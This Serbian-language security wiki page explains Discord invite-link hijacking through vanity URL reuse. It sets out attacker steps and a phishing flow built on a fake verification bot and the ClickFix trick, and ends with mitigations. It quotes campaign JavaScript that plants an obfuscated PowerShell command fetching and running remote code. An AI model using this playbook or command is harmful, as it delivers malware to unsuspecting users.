# Hijacking Discord Invite linkova

Discord invite hijacking zloupotrebljava pravila ponovne upotrebe custom vanity linkova: istekli privremeni invite code ili obrisani permanent code sastavljen samo od malih slova i cifara može biti registrovan kao vanity link na serveru sa Level 3 Boost statusom. Custom vanity link takođe može postati dostupan kada njegov prvobitni server izgubi Level 3 Boost; za uppercase temporary invite, attacker može unapred registrovati lowercase vanity formu dok regularni invite ostaje aktivan, ali redirection počinje tek nakon isteka tog invite-a.<sup>[[1]](#references)[[2]](#references)</sup>

## Tipovi invite-ova i rizik od hijacking-a

Uočeni rizik razlikuje se u zavisnosti od tipa invite-a:<sup>[[1]](#references)[[2]](#references)</sup>

| Tip invite-a          | Može li biti hijack-ovan? | Uslov / komentari                                                                                       |
|-----------------------|---------------------------|-----------------------------------------------------------------------------------------------------------|
| Temporary Invite Link | ✅                        | Nakon isteka, code postaje dostupan i boosted server može ponovo da ga registruje kao vanity URL.       |
| Permanent Invite Link | ⚠️                        | Ako je obrisan i sastoji se samo od malih slova i cifara, code može ponovo postati dostupan.              |
| Custom Vanity Link    | ✅                        | Ako prvobitni server izgubi Level 3 Boost, njegov vanity invite postaje dostupan za novu registraciju.   |

## Koraci eksploatacije

1. Reconnaissance
- Pratite javne izvore (forume, društvene mreže, Telegram channels) za invite linkove koji odgovaraju obrascu `discord.gg/{code}` ili `discord.com/invite/{code}`.<sup>[[1]](#references)</sup>
- Prikupite invite codes od interesa (temporary ili vanity).<sup>[[1]](#references)</sup>
2. Pre-registration
- Kreirajte novi ili upotrebite postojeći Discord server sa Level 3 Boost privilegijama.<sup>[[1]](#references)[[2]](#references)</sup>
- U **Server Settings → Vanity URL**, pokušajte da dodelite ciljani invite code. Ako bude prihvaćen, malicious server rezerviše code.<sup>[[1]](#references)</sup>
3. Hijack Activation
- Za temporary invite-ove, sačekajte da prvobitni invite istekne (ili ga ručno obrišite ako kontrolišete source).<sup>[[1]](#references)</sup>
- Za code-ove koji sadrže uppercase slova, lowercase varijanta može odmah da se claim-uje, iako se redirection aktivira tek nakon isteka.<sup>[[1]](#references)</sup>
4. Silent Redirection
- Korisnici koji posećuju stari link neprimetno se preusmeravaju na server pod kontrolom attackera kada hijack postane aktivan.<sup>[[1]](#references)</sup>

## Phishing tok preko Discord servera

1. Ograničite server channels tako da bude vidljiv samo **#verify** channel.<sup>[[1]](#references)</sup>
2. Deploy-ujte bot (npr. **Safeguard#0786**) koji novim korisnicima prikazuje zahtev da se verifikuju putem OAuth2.<sup>[[1]](#references)</sup>
3. Bot preusmerava korisnike na phishing sajt (npr. `captchaguard.me`) pod izgovorom CAPTCHA ili verification koraka.<sup>[[1]](#references)</sup>
4. Implementirajte **ClickFix** UX trik:<sup>[[1]](#references)</sup>
- Prikažite poruku o neispravnom CAPTCHA-u.
- Uputite korisnike da otvore **Win+R** dijalog, nalepе unapred učitanu PowerShell komandu i pritisnu Enter.

### Primer ClickFix Clipboard Injection-a

Campaign je koristio JavaScript za kopiranje malicious PowerShell komande u clipboard:<sup>[[1]](#references)</sup>
```javascript
// Copy malicious PowerShell command to clipboard
const cmd = `powershell -NoExit -Command "$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9yL6MHc0RHa';` +
`$u=($r[-1..-($r.Length)]-join '');` +
`$url=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u));` +
`iex (iwr -Uri $url)"`;
navigator.clipboard.writeText(cmd);
```
Ovaj pristup izbegava direktno preuzimanje datoteka i koristi poznate UI elemente kako bi smanjio sumnju korisnika.<sup>[[1]](#references)</sup>

## Mitigations

- Prednost dati trajnim invite linkovima i obezbediti da kod sadrži najmanje jedno veliko slovo; obrisani trajni kodovi koji sadrže velika slova ne mogu se ponovo koristiti kao vanity linkovi.<sup>[[1]](#references)</sup>
- Redovno menjati invite kodove i opozivati stare linkove.
- Pratiti status boostovanja Discord servera i preuzimanje vanity URL-ova.<sup>[[1]](#references)[[2]](#references)</sup>
- Edukovati korisnike da proveravaju autentičnost servera i izbegavaju izvršavanje komandi nalep­ljenih iz clipboarda.

## References

- [1] [Od poverenja do pretnje: Hijacked Discord Invites korišćeni za višefaznu isporuku malware-a](https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/)
- [2] [Prilagođeni Invite Link – Discord podrška](https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link)
{{#include ../../banners/hacktricks-training.md}}
